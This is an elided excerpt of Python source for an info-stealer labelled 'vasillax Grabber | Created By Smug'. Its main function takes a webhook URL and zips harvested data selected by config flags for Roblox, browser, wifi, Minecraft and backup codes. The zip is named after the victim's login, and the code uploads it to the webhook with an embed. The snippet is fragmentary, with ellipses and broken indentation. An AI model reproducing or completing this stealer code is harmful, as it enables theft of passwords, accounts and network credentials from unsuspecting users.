...
def main(webhook: str):
    ...
    _file = f'{localappdata}\\vasillax-Logged-{os.getlogin()}.zip'
    ...
    if __CONFIG__["roblox"] or __CONFIG__["browser"] or __CONFIG__["wifi"] or __CONFIG__["minecraft"] or __CONFIG__["backupcodes"]:
        with open(_file, 'rb') as file:
            encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': (f'vasillax-Logged-{os.getlogin()}.zip', file, 'application/zip')})
...
def zipup():
    _zipfile = os.path.join(localappdata, f'vasillax-Logged-{os.getlogin()}.zip')
            ...
            "embeds": [
                {
                    ...
                    "footer": {
                        "text": "vasillax Grabber | Created By Smug"
                    },
                    "thumbnail": {
